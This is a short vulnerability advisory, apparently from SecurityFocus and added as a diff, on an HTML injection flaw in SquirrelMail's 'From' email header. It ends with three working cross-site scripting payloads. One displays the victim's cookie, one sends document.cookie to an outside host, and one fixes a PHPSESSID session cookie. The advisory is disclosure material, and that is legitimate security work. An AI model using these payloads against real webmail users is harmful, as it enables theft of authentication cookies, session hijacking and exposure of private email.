@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/10450/info
+
+SquirrelMail is reported to be prone to a 'from' field email header HTML injection vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied email header strings.
+
+An attacker can exploit this issue to gain access to an unsuspecting user's cookie based authentication credentials; disclosure of personal email is possible. Other attacks are also possible. 
+
+From:<!--<>(-->John Doe<script>window.alert(document.cookie);</script><>
+
+From:(<!--(--><script>document.location='http://www.rs-labs.com/?'+document.cookie;</script><>
+
+From:<!--<>(-->John Doe<script>document.cookie='PHPSESSID=xxx;path=/';</script><> 
